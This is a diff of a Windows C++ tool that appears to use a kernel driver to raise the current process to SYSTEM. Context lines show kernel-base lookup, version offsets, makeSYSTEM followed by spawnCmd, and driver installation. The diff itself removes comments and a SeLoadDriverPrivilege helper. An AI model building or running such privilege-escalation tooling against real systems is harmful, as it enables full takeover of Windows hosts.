@@ -231,10 +231,8 @@ unsigned long long getKernelBaseAddr() {
 }
 
 int processPIDByName(const WCHAR* name) {
-
     int pid = 0;
     
-
     // Create a snapshot of currently running processes
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
@@ -255,12 +253,7 @@ int processPIDByName(const WCHAR* name) {
         CloseHandle(snap);          // clean the snapshot object
     }
 
-    // Cycle through Process List
     do {
-        // Uncomment line below if you want your program to spit out every single list
-        // printf("%20s\t\t%d\n",pe32.szExeFile, pe32.th32ProcessID);
-
-        // Get string match
         if (wcscmp(pe32.szExeFile, name) == 0) {
             pid = pe32.th32ProcessID;
         }
@@ -410,59 +403,6 @@ struct Offsets getVersionOffsets() {
 
 }
 
-BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
-    TOKEN_PRIVILEGES tp;
-    LUID luid;
-
-    if (!LookupPrivilegeValue(
-        NULL,            // lookup privilege on local system
-        lpszPrivilege,   // privilege to lookup 
-        &luid))        // receives LUID of privilege
-    {
-        printf("LookupPrivilegeValue error: %u\n", GetLastError());
-        return FALSE;
-    }
-
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    if (bEnablePrivilege)
-        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    else
-        tp.Privileges[0].Attributes = 0;
-
-    // Enable the privilege or disable all privileges.
-
-    if (!AdjustTokenPrivileges(
-        hToken,
-        FALSE,
-        &tp,
-        sizeof(TOKEN_PRIVILEGES),
-        (PTOKEN_PRIVILEGES)NULL,
-        (PDWORD)NULL)) {
-        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
-        return FALSE;
-    }
-
-    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
-
-    {
-        printf("The token does not have the specified privilege. \n");
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-void enableSeLoadDriver(void) {
-    HANDLE hToken;
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        SetPrivilege(hToken, SE_LOAD_DRIVER_NAME, true);
-        CloseHandle(hToken);
-    } else {
-        PRINT_ERROR_AUTO(L"enableSeLoadDriver");
-    }
-}
-
 int wmain(int argc, wchar_t* argv[]) {
     getKernelBaseAddr();
     if (argc < 2) {
@@ -499,7 +439,6 @@ int wmain(int argc, wchar_t* argv[]) {
         makeSYSTEM(GetCurrentProcessId(), offsets);
         spawnCmd();
     } else if (wcscmp(argv[1] + 1, L"installDriver") == 0) {
-        //enableSeLoadDriver();
         if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
             wprintf(L"[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
         }
